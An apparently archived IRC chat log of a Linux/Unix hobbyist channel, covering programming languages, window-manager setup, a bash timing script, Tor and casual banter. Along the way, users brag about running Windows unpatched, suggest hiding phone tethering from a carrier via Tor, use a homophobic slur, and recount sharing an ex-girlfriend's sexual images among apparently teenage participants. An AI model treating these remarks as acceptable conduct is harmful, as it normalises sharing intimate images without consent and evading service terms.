11:49        kirby │  Yeah he kept telling us we could use any languge so I used C++.
11:50  thang1thang │  how'd that work out?
11:51        kirby │  He had issues compiling it so I had to static link stuff.
11:51  thang1thang │  "kirby im gonna have to knock a couple points off on this assignment. You didn't use enough pointers. I've seen a lot of C code in my time, and you need at least 500 pointers per line of code to do anything"

12:33  thang1thang │  I love reading stuff that this guy writes
12:33  thang1thang │  He completely flips his shit and rages if he is forced to use bash over ksh
12:34        kirby │  Shall have a look.
12:34        kirby │  Think I found the segfault as well, I forgot to reset a value >.<
12:37  thang1thang │  sweet
12:37  thang1thang │  at least it's not horribly difficult to correct
12:37  thang1thang │  just a bitch to find xD
12:37        kirby │  I used gdb for the first time ever, and it wasn't too bad.
12:37        kirby │  Told me the exact function.
12:37  thang1thang │  gdb?
12:38        kirby │  GNU Debugger.
12:39  thang1thang │  oooh okay
12:39  thang1thang │  sounds good
12:39  thang1thang │  I don't have any kind of useful debugging crap like that on os x, I think...
12:39  thang1thang │  everything I need to debug I have to run through codeblocks ._.
12:39        kirby │  I had to install it yeah.
12:40        kirby │  Not fond of IDEs.
12:40  thang1thang │  or just trying to compile through terminal
12:40  thang1thang │  Yeah I dislike IDEs as well...
12:40  thang1thang │  not sure how to get better at debugging though
12:40        kirby │  When I did VB at school I had to use Visual Studio, I think that put me off.
12:40        kirby │  Especially with C++, jesus everything is so convoluted.
12:40  thang1thang │  lol yeah
12:40  thang1thang │  VB with c++
12:40  thang1thang │  you poor soul
12:40  thang1thang │  there are MUCH better IDEs out lately
12:41        kirby │  I basically ditched VB for C++.
12:41  thang1thang │  like, a fermented potato
12:41  thang1thang │  because nothing is worse than VB... .-.
12:41        kirby │  But I like writing an essay to declare variables!
12:41  thang1thang │  lol
12:42  thang1thang │  And I like writing my dissertation in forloops...
12:42        kirby │  I was so bad at it I never used a single loop.
12:42        kirby │  Didn't get them.
12:42        kirby │  Still got an A*, go figure.
12:42  thang1thang │  seriously? You don't understand forloops but you got an A?
12:42  thang1thang │  they're amazing
12:42  thang1thang │  (int i = 0 ; i <= 50 ; i ++)
12:43        kirby │  Oh I know now.
12:43        kirby │  When I was doing VB.
12:43  thang1thang │  { cout << " i  \n" ; }
12:43  thang1thang │  oooh got it
12:43  thang1thang │  yeah you better know now lol

12:45  thang1thang │  I don't even like python, it seems so silly
12:45        kirby │  I don't.
12:45  thang1thang │  I mean, I'll probably learn it eventually
12:45  thang1thang │  but 80% of programmers just say stuff like "oh I got my start with python (and then never used that POS again)" :p
12:46        kirby │  Whereas I know a few people that really love it.
12:46  thang1thang │  yeah
12:46  thang1thang │  all depends on what you do, and perspective, etc

12:46  thang1thang │  what about privacy? o.O
12:46  thang1thang │  I totally need to learn perl
12:47        kirby │  If only so you learn regular expressions.
12:47        venam │  thang1thang2: python was one  of the first language I learned also
12:47        kirby │  So good.
12:47        venam │  excluding VB
12:47  thang1thang │  lol
12:47        venam │  which I completely forgot and never want to remember
12:47  thang1thang │  I don't think anyone ever wants to remember VB...
12:48        venam │  now all I do is C++, C, Perl
12:48  thang1thang │  hmm, what do you think of perl vs python?
12:48        venam │  but I still use python for easy webinteraction
12:48        kirby │  venam: I like you :p
12:48  thang1thang │  They both seem to do (more or less) very similar tasks well
12:48        venam │  Perl is freaking cool
12:49        kirby │  On this IRC, people who prefer Perl over Python seems to be quite rare.
12:49        venam │  nah, Perl is another world
12:49        venam │  CPAN
12:49        venam │  you can do the same thing in a million ways, unlike python
12:49  thang1thang │  I prefer assembly and punch cards

12:50        kirby │  Only 70s kids will get this.
12:50  thang1thang │  You could upgrade your processor speed by laiminating the cards so you could swap them on the terminal faster
12:50  thang1thang │  can you do that now, huh?! I'd like to see YOU laminate your laptop. Man, tech is shit these days
12:51        kirby │  inorite

14:08  thang1thang │  it's just a .pkg

14:16  thang1thang │  popplar allows for editing of pdfs through the commandline
14:18  thang1thang │  ooooh got it
14:18  thang1thang │  it's also a rendering thing for pdfs
14:18  thang1thang │  so other applications (or you) can pull data into pdfs and render them :p
14:19  thang1thang │  wow, you can turn pdfs into a freaking powerpoint presentation with popplar commands in a frontend .-.
14:22         yrmt │  :)
14:22         yrmt │  it also has a qt frontend
14:22  thang1thang │  Saw that :) I'll stick the Qt frontend into the list of stuff I'm putting into the script
14:23  thang1thang │  the poppler-qt package is version 0.16.7nb7 while the latest poppler is 0.24.1

14:37         yrmt │  I used to do that all the tme
14:37  thang1thang │  I could do that if I wanted to but I don't feel like it

14:37  thang1thang │  You want to know the best part?
14:38  thang1thang │  I've handled sleep deprivation for so long, so often due to video gaming addiction and general teenage stupidity
14:38  thang1thang │  that I can just say "oh welp, I'm not going to get tired for the next 60 hours..."
14:38  thang1thang │  Like one week in Uni. I slept 5 hours in between monday morning and friday afternoon
14:38  thang1thang │  wasn't even burned out
14:39  thang1thang │  MultiTail just released V6 but pkgin's only got v4.0.6 .-.

14:40        kirby │  I couldn't stay up gaming on my own, have done with programming before.
14:40  thang1thang │  I've gotten worse at staying up since I treat my body better, tbh
14:40  thang1thang │  you have to train yourself to handle sleep deprivation
14:41  thang1thang │  In my worst times I would average 2-3 hours of sleep a night until the weekend. then it'd be 8 and 10 or something like that and then repeat
14:41  thang1thang │  Always felt fairly fine. Waking up was rough, mental state was slightly slower, but it wasn't too bad. Every two/three months I'd crash and sleep for 16 hours, but eh

14:44  thang1thang │  the wm would be 2bwm and I have to put that in the script on its own because I have to clone from git rather than using pkgsrc

14:52         yrmt │  + it beats dwm performance wise

15:01  thang1thang │  there's the shell script as I have it so far
15:02        venam │  if you like tilling use dwm if you like floating/stacking use 2bwm
15:02        venam │  as simple as that
15:02       Ypnose │  yes
15:02  thang1thang │  I like both though ;-;
15:03  thang1thang │  I love tiling but I want to be able to pop out windows as needed to see them larger or whatever and then push them back into the tile
15:03       Ypnose │  do you plan to support wayland with 2bwm?
15:03       Ypnose │  out of curiosity
15:04        venam │  I didn't start getting interested in wayland, I didn't even start reading the docs and what it supports
15:05         yrmt │  you can also use cwm
15:05         yrmt │  venam: it could be cool
15:05         yrmt │  o/ Ypnose 
15:06        venam │  cwm is nice also
15:06        venam │  I think wayland has easy support for 3d and special effects
15:08  thang1thang │  you know what else has special effects?

15:20  thang1thang │  I have a patch to make the animations on my phone super fast as well

15:22  thang1thang │  yrmt: can I install dwm straight from pkgsrc or do I have to clone it in git?

04:22         dbcp │  ah
04:22         dbcp │  well, I'm pretty excited about going
04:22       zygotb │  11 B
04:22       zygotb │  Where you going to?
04:23         dbcp │  I'm going into the Air Force.  My Basic's going to be at Lackland
04:23       zygotb │  Right, I remember asking before...
04:24       zygotb │  I wish I'd have went into the Air Force instead of the Army...
04:24         dbcp │  oh, right, we've had this conversation before lol
04:24       zygotb │  Computers and schooling wise the Air Force is a "no brainer"
04:24         dcat │  why zygotb?
04:25       zygotb │  Practical application of experience to civilian jobs...
04:26         quit │  libbro
04:27         dbcp │  Air Force actively encourages Education by requiring Community College - level training (from the Community College of the Air Force) after Basic, and every career field you go into, you're given pretty good training and certification for that field.  
04:27       zygotb │  I was a glorified gun instead of an educated mind.
04:28         dbcp │  After Basic Training, I'll be at Tech School for about ~6 months, where I'll get my second Associate's Degree (in IT/Networking) and I'll get CCNA certs and a Security+ cert.  
04:29       zygotb │  Make no mistake, I'm not implying that it doesn't take brains to run an infantry platoon, but I'd rather have experience in more tech related areas relating to computers.
04:29         dcat │  can you get into the army with something on your permanent record?
04:29       zygotb │  I'm not sure.
04:31       zygotb │  But I mean that I wish that I had went into computers about ten years earlier than I did.

04:32         dbcp │  dcat: Probably, but I don't think you'd be able to get a high security clearance depending on what it is
04:33       zygotb │  But back in 1982 jumping out of airfcraft seemed more exciting.
04:33       zygotb │  Riding around in choppers is always a blast.
04:34       zygotb │  Rappelling out from about 80 feet...
04:34     BigE|Away│  BigE
04:37         dbcp │  I can't wait to learn how to assemble/disassemble an M16A2
04:37       zygotb │  It's simple
04:38       zygotb │  Depending on how much disassembly is done.
04:38         BigE │  lol
04:39       zygotb │  The trigger group can be a bitch, but for field stripping the M16A2 is easy to do.
04:41         dbcp │  well, even though I grew up in Mississippi, my only experience with guns has been with shooting shotguns and a couple of target practices with a pistol.  I've never disassembled one, though, so I'm excited as hell
04:45         trgc │  dbcp: what are you doing?
04:45       zygotb │  I've always loved shooting, since I was a teen with my air rifle, to my grand dad's old .22LR, by the time I got to the M16 I was drooling over the .50 M2 but ended up using the M60 mostly.
04:46       zygotb │  The M4 is like the Cadillac of rifles.
04:47       zygotb │  The H&K weapons are more like Mercedez Benz. LoL
04:47         BigE │  until you use an FN
04:47         BigE │  oh wait
04:47         BigE │  cadillac
04:47         BigE │  my bad
04:48       zygotb │  Oh yeah! FAL.
04:48         BigE │  and the Aston Martin?
04:48         BigE │  Whats that
04:48         trgc │  what basic training is dbcp going to?
04:48       zygotb │  Hmmm...
04:48       zygotb │  USAF
04:48         trgc │  Do they still get to shoot the M16 or do they just take it apart now?
04:49       zygotb │  The Aston Martin of rifles...?
04:49       zygotb │  You'll be shooting...
04:49       zygotb │  After you learn to assemble/disassemble/service/etc
04:50       zygotb │  The Aston Martin of rifles...?
04:50         BigE │  you said that the M4 is the cadillac
04:50         dbcp │  trgc: I'm gonna be doing IT Maintenance in the Air Force
04:50       zygotb │  Right...
04:50         BigE │  it gets a whole lot nicer than a cadillac....
04:50       zygotb │  Yeah...
04:50         trgc │  The air force uses the a2?
04:50         BigE │  cadillac is like, a mid range car at best
04:50       zygotb │  H&K is like the Ferrari.
04:50         BigE │  so
04:51         BigE │  okay
04:51         BigE │  see, that is what I was asking
04:51         dcat │   AG3 master race
04:51       zygotb │  The Aston Martin could well be the M2 BMG
04:53         trgc │  Didn't realize USAF still touched guns in basic
04:53         dcat │  aka norwegian hand cannon
04:53         trgc │  is it a qual that you'll have to repeat or is it just something they teach?

05:16         BigE │  no idea
05:16  thang1thang │  No idea either, my guess would have to be "it depends on what you're comparing"
05:17         BigE │  yeah
05:17  thang1thang │  if you're comparing data that's only absolute values or real numbers, the proceeding zero wouldn't matter because 02 is still 2 and 000002 is still 2
05:17         BigE │  ^
05:17          evo │  Yeah then it should be fine
05:17      zygotb_ │  There's an error on the server side: https://paste.xinu.at/2ig/
05:17         pico │  Title: stdin (at paste.xinu.at)
05:17  thang1thang │  if you're comparing data that's byte information then the proceeding zero would matter because the computer would read 02 differently than 2 or 002 (like in version numbers)
05:17          evo │  I'm doing: if (( $fs > $ts + $2  )); then
05:18          evo │  Where the vars are only numbers
05:18  thang1thang │  okay. If they're only numbers then yeh, I can't see the proceeding 0 making a difference
05:19          evo │  Basically I have: date +%d:%T in a var then I'm using ${var:0:2} to grab individual parts and comparing them
05:20          evo │  so ts would be the date var with a positional value like above being compared to a file date var with the same positional value (I formatted the two commands the same)
05:21          evo │  Been working 3 days on this script and still not done
05:21  thang1thang │  I know that feel lol

05:22  thang1thang │  that pastebin makes zero sense, and it's hilarious
05:23  thang1thang │  Okay. My bad, I wrote it wrong in my head :p
05:23          evo │  day, hour, minute, second
05:23       zygotb │  *16 is the inet address... *255 is the broadcast address.
05:23       zygotb │  Of the server...
05:23       zygotb │  LoL
05:25  thang1thang │  If you're in day, 02 is the same as 2. If you're in hour, 02 is the same as 2. Same for minute and seconds as well. However, depending on how you grab data, and if there's any variance in the data, if you're parsing the 02 wrong it'll look the same as either 02, 2 or 20 to the script... You shouldn't have that problem with the command you were using
05:26  thang1thang │  Can't think of how one could parse any preceeding zero + number combos wrong like that, but I'm sure it's possible to fuck it up somehow
05:26  thang1thang │  I long ago stopped saying it's impossible to write code "(such and such) badly" because I have been continually surprised :p

05:30         BigE │  we dont do that sort of thing here
05:31  thang1thang │  I'm sure it's possible to create that travesity
05:31  thang1thang │  eh, I'm not saying it's smart or that he should do it. I'm saying it'd be hilarious to see it actually work
05:32  thang1thang │  can you imagine walking into like some linux conference and talking to Linus and being all like "hey so I finally got my server working right, all I had to do was install dropbox..."
05:33  thang1thang │  But anyway, zygotb: what are you actually using the server for?
05:33         BigE │  lol
05:33         BigE │  that would probably be funny
05:34         BigE │  if you actually managed to do that, they would probably let you do a defcon talk on it just for the lulz'
05:34  thang1thang │  "How I managed to break the internet, without incurring a stroke"

05:40         BigE │  probably also use it as an i2p proxy
05:40       zygotb │  Is NeoTerra here?
05:40  thang1thang │  havne't seen him reply, think he's doing something
05:40       zygotb │  Jayro?
05:40         BigE │  without explaining how i2p works, you need a fair amount of bandwidth to make the most of it
05:40         BigE │  neo isnt here
05:41  thang1thang │  yeah, i2p seems like it would need a ton of bandwidth
05:41       zygotb │  I was hoping to be able to send my payment via USPS using cash.
05:41  thang1thang │  lol
05:41  thang1thang │  I mean, that's legitimate I guess, that just sounded really funny
05:42       zygotb │  I clicked the "Buy Now!" button and got a PayPal stall.
05:43         BigE │  well, i2p is an anonymization layer that addresses the problems of a global passive adversary, and the traffic analysis that can happen with that, given that a foe is completely omnicient
05:43         BigE │  so that means that i2p, like gnunet, is always sending and receiving a stream of data
05:43         BigE │  so that when you decide to use it, no one can tell that you are using it
05:44       zygotb │  Mash network?

05:47          evo │  $blah would be set through read in interactive mode
05:47          evo │  but its the same kind of thing, just a number
05:48  thang1thang │  yeah, it's making a little more sense now. I was gonna say that it looks like you need an argument on the right side of the OR somewhere, but you kinda do have an argument on the right side so I can see it working
05:48          evo │  If not I can just make $2 and $blah the same
05:48  thang1thang │  seems like you're just making an if/else statement with the || though
05:49          evo │  like blah=$2 then if its not set the read would fill it out anyway
05:50  thang1thang │  So you want blah to always equal $2 except if blah isn't set as a value, then blah is set as what's read in interactive mode?

06:10          evo │  luckily its set to check every second so I don't have to worry about most times, but say somehow set it to 60 seconds when the clock is at :00 for seconds and then it goes by and its :00 again

06:10  thang1thang │  Ahh, okay so that's the big problem right now?
06:11          evo │  Yeah I'm worried it might not work right
06:11  thang1thang │  ooh, you're using the system timestamp to judge passed time
06:11          evo │  yep
06:11          evo │  which could change among other issues
06:12          evo │  it saves the timestamp once per script instance
06:12          evo │  as a kind of anchor point
06:13          evo │  I'm sure once I'm in my arch install it will be much easier with faster and more reliable testing
06:13  thang1thang │  have you tried using the date bash command with the arthemetic implied inside of it?
06:13  thang1thang │  http://stackoverflow.com/questions/8903239/how-to-calculate-time-difference-in-bash-script this is kinda different question
06:13         pico │  Title: date - How to calculate time difference in bash script? - Stack Overflow (at stackoverflow.com)
06:14  thang1thang │  but I found this quote interesting: "Incidentally, you can trick date into performing the time arithmetic for you, by writing date -u -d @"$diff" +'%-Mm %-Ss'. (That interprets $diff as seconds-since-the-epoch, and computes the minutes and seconds in UTC.) That's probably not any more elegant, though, just better obfuscated"
06:14          evo │  Yeah id rather it be easy to read, or It will look like ancient greek within a few weeks of completing it
06:15  thang1thang │  yeah, but theoretically
06:16  thang1thang │  you could just use date -u -d @ "$diff" +%-Mm %-Ss' or some similar syntax
06:16  thang1thang │  to calculate time passed and then execute a command
06:16  thang1thang │  and for readability you could have echo logs parsed from the date command?
06:17          evo │  Hm I'll look into it, anything would be better than what I'm doing right now
06:19  thang1thang │  huh
06:19  thang1thang │  apparently awk doesn't have some of the inconsistencies that bash does when it comes to integer arithmetic and time

06:55         BigE │  yeah
06:55         BigE │  so this means I have to go into my bios, disable the linux disk, direct boot from windows, let it update

06:55         BigE │  ffs
06:55  thang1thang │  or
06:55  thang1thang │  orrr
06:55  thang1thang │  don't give a shit

06:56         BigE │  extreme tiling
06:57  thang1thang │  but really though, just use windows without the updates. I've never seen a useful windows update that actually does any performance enhancement or whatever...
06:57  thang1thang │  unless you're going from W8 to 8.1
06:57  thang1thang │  or 7 to SP1 or something major like that
06:57         BigE │  like I am going to run the security nightmare that is windows without installing security updates
06:57         BigE │  well, this is win7 SP1
06:57  thang1thang │  oh
06:57  thang1thang │  Are you paranoid about security on your computer? o.O
06:58         BigE │  maybe a little?
06:58  thang1thang │  I run windows 7 on the desktop
06:58         BigE │  I am not worried about windows leaking into my Linux setup, as the linux part is AES256
06:58  thang1thang │  100% unpatched since forever
06:58  thang1thang │  no antivirus
06:58         vypr │  Aren't we to be a little paranoid on whatever we use?
06:58         BigE │  but I dont want my steam creds or something stolen

06:59         BigE │  good for you
06:59  thang1thang │  I only have to clean it out like ever 3-5 months and it takes 10 minutes
06:59  thang1thang │  never had a virus
06:59         BigE │  that you know of
06:59  thang1thang │  idk, i just find it really hard to care about "security updates"
06:59         BigE │  cause how would you tell without a few AV's on it
06:59  thang1thang │  true
06:59         BigE │  -_-
06:59  thang1thang │  except I scan it every time I come back from break
07:00  thang1thang │  and then turn it back off :p
07:00         BigE │  so you *do* use an AV
07:00         BigE │  uh huh
07:00         BigE │  seems legit
07:00  thang1thang │  *do* in the fact that I turn it on every 5 months but never use it ever?
07:00         BigE │  no lies happening here
07:00  thang1thang │  never found anything with it lol
07:00         BigE │  k

07:02         BigE │  I am always paranoid
07:02  thang1thang │  and made daily backups to their computer, and hourly backups online to dropbox or something
07:02  thang1thang │  their biggest complaints about android were
07:02  thang1thang │  1) it uses too much data doing nothing
07:02  thang1thang │  2) it uses too much battery
07:02  thang1thang │  -_-
07:03         BigE │  lul

07:05  thang1thang │  why no google apps?
07:05  thang1thang │  actually nvm
07:05  thang1thang │  plenty of reasons for no google apps lol
07:05         quit │  tbuck
07:06         BigE │  because I dont trust google with my data any more than I would trust a crackhead with a stack of 20's
07:06  thang1thang │   lol I was gonna say
07:07  thang1thang │  I'm kinda at the point where I fully acknowledge that google, apple and the NSA know more about me than I do
07:07  thang1thang │  and I just kinda frankly don't care. I'll probably clean up my data a bit and lock them out of my life

07:09  thang1thang │  anyway I have some experience with it
07:09  thang1thang │  if you wanna tether it's probably the best around
07:10         vypr │  It doesn't charge from your provider, correct?
07:10  thang1thang │  gotta be careful about it though

07:10         BigE │  how will they tell
07:10         BigE │  ?
07:10  thang1thang │  it's different outside of the US though, I think. What's your carrier?
07:11     NeoTerra │  BigE you sound surprised? :P
07:11  thang1thang │  they can tell based on a lot of stuff. If you use your phone you have to pipe your data through the phone, so the second you use something "incompatible" with a phone
07:11  thang1thang │  they can tell you're tethered
07:11         BigE │  NeoTerra: you literally cant update unless you A) unplug all SATA cables going to non-windows drives or B) go into bios and use the boot override
07:11  thang1thang │  it could be something as stupid as watching flash youtube videos on an iPhone that's piping data to your laptop
07:12     NeoTerra │  trgc check your IRC PM :)

07:13         BigE │  NeoTerra: wanna play something that isnt Arma?
07:13  thang1thang │  as of 2011
07:13     NeoTerra │  like what BigE?
07:14         BigE │  no idea
07:14  thang1thang │  Sprint: Data can only be used for web surfing, email, photographs, non continuous streaming of vids, downloading files, or gaming
07:14  thang1thang │  you cannot use sprint data for... Tethering to PC's, or equipment
07:15  thang1thang │  You must have a specific plan that allows tethering
07:15         vypr │  They have separate plans for that.
07:15  thang1thang │  fairly par for the course
07:15         vypr │  But wouldn't this bypass that?
07:15  thang1thang │  It would
07:15         BigE │  NeoTerra: what do you have installed besides arma and css?
07:15         quit │  bottomy
07:15  thang1thang │  but if they catch you they might void your service
07:15  thang1thang │  shouldn't happen, but its a possibility
07:15         BigE │  pipe everything through Tor
07:15     NeoTerra │  jc2, csgo, fallout 3, that's about it
07:15  thang1thang │  lol
07:15         BigE │  then they cant read it without breaking AES

07:15  thang1thang │  yeah
07:16         BigE │  NeoTerra: you are just not fun you know
07:16  thang1thang │  tor is the best solution to stream youtube videos 24/7 on a laptop
07:16  thang1thang │  nothing could ever possibly go wrong with that idea
07:16         BigE │  sure.
07:16         BigE │  go for it.
07:16         BigE │  if I ever met someone like that IRL, I would probably deck them

07:25  thang1thang │  wut
07:25         vypr │  heh
07:25  thang1thang │  what the hell did they do to it? You poor soul
07:25  thang1thang │  is it a chromebook or something?
07:25       koprii │  It windows merrrr
07:25  thang1thang │  lol
07:25         vypr │  thang1thang2, chromebooks have irc clients you derp
07:25       koprii │  Deletes everything on each reboot
07:26  thang1thang │  I figured chromebooks had an IRC client
07:26         vypr │  koprii: ssh is your friend.
07:26  thang1thang │  but I thought I remembered reading an article where someone figured out how to lock chromebooks waaaaay down for use with stuff like schools
07:26         vypr │  if you can still access your old servers
07:26       koprii │  I know
07:26       koprii │  vypr my OpenBSD server is still up and purring
07:26         vypr │  thang1thang2: its possible, but i don't expect schools to consider using chromebooks as a platform.
07:26       koprii │  I made me moms turn it on for me
07:27         vypr │  koprii: that's good, i'm glad you're helping yourself by going to rehab.
07:27         vypr │  proud of you, kopri.
07:27         vypr │  also, shix stopped giving a fuck about your porn.
07:27         vypr │  so thats good.
07:27  thang1thang │  lol
07:28         mxtm │  vypr: why would he give a fuck about it lol
07:28         vypr │  mxtm: you must not have been here when that happened.
07:28         vypr │  that's a story for another time.
07:28         mxtm │  vypr: yeah I wasn't, or was idling

07:29         mxtm │  vypr: I gotta know ;_;

07:29         mxtm │  or a summary
07:29         vypr │  mxtm: kopri shared a photo of an ex-gf sucking his cock, then shix wanted more, and had kopri upload a video and shix wanted it.
07:29         vypr │  that's a basic summary.
07:29      kopriii │  lel

07:33         mxtm │  every day when I go to school I must use Windows 8
07:33  thang1thang │  ever since I started programming, I cry every time I see a windows computer
07:33         mxtm │  it makes me cry
07:33         vypr │  yet again I could give a fuck less since I'm 15.
07:34  thang1thang │  I have windows 8 on my computer as a partition
07:34  thang1thang │  it makes me hate myself
07:34         mxtm │  vypr: I'm 15 too but right now I'd take my time w/ that decision, lol
07:34         mxtm │  thang1thang2: you sohuld

07:37         vypr │  around that time.
07:37  thang1thang │  nice
07:38  thang1thang │  I got into computers 'cause of no social life
07:38  thang1thang │  so I got into video gaming and kinda lost about 4-5 years of my life
07:39  thang1thang │  went straight from 10-11 to 16 years old
07:39         vypr │  Xubuntu > Arch > Manjaro > Xubuntu > Slackware > Fedora > Arch
07:39         vypr │  I also have my own chromebook.
07:39  thang1thang │  nice. You like it?
07:39         vypr │  Computers are in my blood, got that trait from my dad.
07:40         vypr │  Its alright.
07:40  thang1thang │  I became the most computer literate person in the family
07:40  thang1thang │  when I found out where the control panel was in windows xp
07:40         vypr │  I put it into Developer Mode and disabled rootfs verification so I have dem freedoms.
07:40         vypr │  Yeah, I'm there aswell.
07:40         vypr │  I got heavily involved with programming at 9.
07:40         quit │  mxtm
07:40         vypr │  Eventually wanted to try something new, so I tried Xubuntu.
07:40  thang1thang │  python?
07:41         quit │  libbro
07:41         vypr │  Visual Basic.NET and VB6.
07:41         vypr │  One of the first notable creations I made was a Club Penguin cheat client.
07:41         vypr │  :P
07:41  thang1thang │  lol
07:41  thang1thang │  dem club penguin steez
07:41  thang1thang │  I never got into it though
07:41  thang1thang │  I had already graduated to MMOs by then
07:41         vypr │  That was my goto game for a little while
07:41         vypr │  I grew out of it though.
07:41         vypr │  I also played Roblox for some time.
07:42  thang1thang │  I'm so sorry about that VB though
07:42  thang1thang │  nobody should have to go through that...
07:42         vypr │  Nah, don't be.
07:42         vypr │  It was a fun experience.
07:42         vypr │  We all start somewhere.
07:42         vypr │  I'm currently learning C, however

07:43  thang1thang │  I'm learning C++ but I've taken a small break because I can never learn anything outside of school
07:43         mxtm │  what was the last thing I said lol
07:43         vypr │  Ah.
07:43  thang1thang │  "I love big butts and I cannot lie
07:43         mxtm │  ah yeah that's the truth
07:43  thang1thang │  - mxtm
07:43         vypr │  mxtm: "yeah probably"
07:43         mxtm │  I got in to Linux / Unix / whatever in like 2008 - 2009
07:43         join │  functorfun
07:44         mode │  +v functorfun

07:44         vypr │  I wanna get into the *BSDs though.
07:44         mxtm │  5 or 6 years ago
07:44         mxtm │  so like since I was 9 - 10
07:44         vypr │  But the setup is too time-consuming for me to use it.
07:44         BigE │  l guess I am a fag, didnt really start using linux seriously till like 2 years ago
07:44         mxtm │  and that's same for programming too
07:44         mxtm │  BigE: you should feel horrible about it.

07:44  thang1thang │  BSD? that's not hard to setup at all
07:44  thang1thang │  just buy a mac :p
07:44         mxtm │  and along the way I've used tons of distros and used laptops, servers, everything
07:45         vypr │  thang1thang2: pls send $1000 USD my way, kthx.
07:45         mxtm │  I have a MacBook Pro >.>
07:45         mxtm │  it's what I'm using right now
07:45         mxtm │  running Arch though
07:45  thang1thang │  what model MBP?
07:45         mxtm │  early 2011, 15" base
07:45         mxtm │  the last BSD I tried was PC-BSD on a really shitty laptop a while ago
07:46  thang1thang │  hue, late 2011 for me 13", CPU upgrade and 8GB ram
07:46         mxtm │  that screen though
07:46         mxtm │  tiny tiny
07:46  thang1thang │  macs do have beautiful screens lol
07:46         mxtm │  i5?
07:46  thang1thang │  And eh... 13" is big enough for me for a lot of stuff
07:46  thang1thang │  the cpu upgrade was massive for the late 2011 13"
07:46  thang1thang │  it went from dual i5 to dual i7 @2.8GHz
07:47         mxtm │  I have i7 quad w/ HT
07:47  thang1thang │  it was something stupid like a 30% performance increase in photoshop for $100 more
07:47         mxtm │  2.0 GHz but it goes "turbo boost" up to... 2.6 GHz or something
07:47  thang1thang │  yeah mine turbos to 3.4 :p
07:47         mxtm │  I need more RAM though, when I was trying to build Android recently it wasn't pretty
07:47         vypr │  anyone use tor with dwb?
07:48         BigE │  I decided to do an octacore AMD
07:48         BigE │  no regrets
07:48         mxtm │  my wm setup takes up almost no RAM though so
07:48         mxtm │  ah nice
07:48         BigE │  vypr: you need a go between
07:48         BigE │  to create an http proxy for dwb
07:48         BigE │  I suggest privoxy
07:49  thang1thang │  yeah, unix is crazy with its ram
07:49  thang1thang │  my dad had a throwaway mac mini from a friend of his from like 2006
07:49  thang1thang │  512MB ram
07:49  thang1thang │  60GB hard drive...
07:49         vypr │  BigE: thank you.
07:49         vypr │  i found a way to do it though
07:49         vypr │  with torify
07:49         mxtm │  running web browser, IRC client, music player, visualizer, torrent client, it's taking up 825 MB RAM and 4% CPU lol
07:49         vypr │  and i can visit .onion sites
07:49         BigE │  oh yeah
07:49         vypr │  so that's good
07:49  thang1thang │  ran like a Piece of shit. It actually had os x 4.10.11 on it
07:50         BigE │  just a heads up, I dont know if dwb has been vetted for DNS leaks and shit
07:50         vypr │  i'll do a test
07:50  thang1thang │  I just wiped the whole thing and installed puppy linux or one of those other "takes 30MB ram" distros
07:50         mxtm │  and thang1thang2, I triple booted a piece of shit laptop without a battery, 512 MB RAM and 16 GB HDD
07:50  thang1thang │  nice
07:50  thang1thang │  people got linux to run off of a potato
07:50  thang1thang │  unix*
07:50         mxtm │  lol
07:51  thang1thang │  but yeah, after I put one of those ultra lightweight distros on there
07:51  thang1thang │  that computer flew in comparison
07:51  thang1thang │  she could actually open like 20 tabs in chromium...
07:51         BigE │  vypr: dat wireshark
07:51         quit │  akacase
07:52         vypr │  BigE: Meh, nothing major,
07:52         vypr │  Its getting Tor's ip then my VPNs.
07:53         BigE │  you should be going Tor -> VPN
07:53         BigE │  not the other way around
07:53         vypr │  i mean in general
07:53         BigE │  otherwise your anonymity is pretty much gone
07:53         BigE │  k
07:53         vypr │  i apologize for the confusion
07:53         BigE │  oh yeah
07:53         BigE │  k
07:55  thang1thang │  I have dwm installed on my os x
07:55  thang1thang │  so happy
07:55  thang1thang │  2bwm didn't wanna work for whatever reason but dwm did it like a charm :p
07:56         BigE │  dwm is nice
07:56         BigE │  I couldnt get past all the silly patches though
07:56         BigE │  so xmonad master race
07:56  thang1thang │  silly patches?
07:57         quit │  vypr
07:57         BigE │  yeah
07:57         mxtm │  dwm is gr8
07:57         BigE │  you have to patch in support for a lot of things in dwm
07:57  thang1thang │  ahh
07:57         mxtm │  I have it patched perfectly and on my GitHub
07:57         mxtm │  so I'm happy
07:57  thang1thang │  yeah I can't get any keybinds working on dwm atm
07:57  thang1thang │  I think it has to do with os x using return instead of enter or something

08:09  thang1thang │  and it'll pop up the dialogue every 3 seconds...

08:20         mxtm │  yeah i know
08:20  thang1thang │  they just get a lot of hate probably for the same reason nickleback does
08:20         mxtm │  dont u dare

08:20         mxtm │  i will destroy you

08:20         mxtm │  lol

08:21  thang1thang │  sleeping with sirens is probably the most mainstream metalcore band ever
08:21         mxtm │  and they don't mock them
08:21         mxtm │  ex-fucking-actly
08:21         mxtm │  but they still just mess w/ FIR
08:21         mxtm │  but not anything like SWS with Kellin's goddamn voice lol

16:14   emptytapes │  well, i got some install -m pop ups
16:14   emptytapes │  love you
16:14        venam │  if there's a binary file then it's compiled

16:15   emptytapes │  oh
16:15        venam │  2bwm
16:16        venam │  but there should be a 2bwm.o also

16:16   emptytapes │  i typed make i haven't got those.. :/
16:16        venam │  does make return 0?
16:16         dcat │  run `make clean && make`
16:16        venam │  then echo $?
16:16   emptytapes │  thanks dcat
16:16        venam │  if it's 0 then everything is fine
16:17   emptytapes │  got the binary now
16:17         dcat │  then `sudo make install`
16:17   emptytapes │  ok done
16:17        venam │  then get your .xinitrc ready
16:17   emptytapes │  ok

16:19   emptytapes │  oops sorry
16:19         dcat │  make it a rule of thumb to try to find out yourself before asking
16:20   emptytapes │  sorry haha
16:20         dcat │  heh, that's fine
16:20        venam │  I start it this way:
16:20        venam │  2bwm&
16:20        venam │  exec urxvt
16:21         dcat │  I start it this way;

16:21         dcat │  exec 2bwm
16:21        venam │  like that if 2bwm crashes or if I want to dynamically start another wm I don't have to restart X
16:21   emptytapes │  okk :) ill do that cuase i stated it now I just got a black sceen :P
16:22         dcat │  did you configure your config.h to suit your terminal?
16:22   emptytapes │  i think so
16:22         dcat │  if I'm not mistaken, the defualt is urxvtc?
16:22   emptytapes │  must be a typo
16:23   emptytapes │  I have urxvt
16:23        venam │  add urxvtd -q -o -f to your .xinitrc
16:23         dcat │  and you have that in your config?
16:24   emptytapes │  i have urxvtc so im changing it now
16:24         dcat │  nah, don't.
16:24   emptytapes │  ok
16:24         dcat │  just fire up the urxvtd in your .xinitrc
16:25   emptytapes │  YAY! IT WORKS

17:28   emptytapes │  ok thanks :)
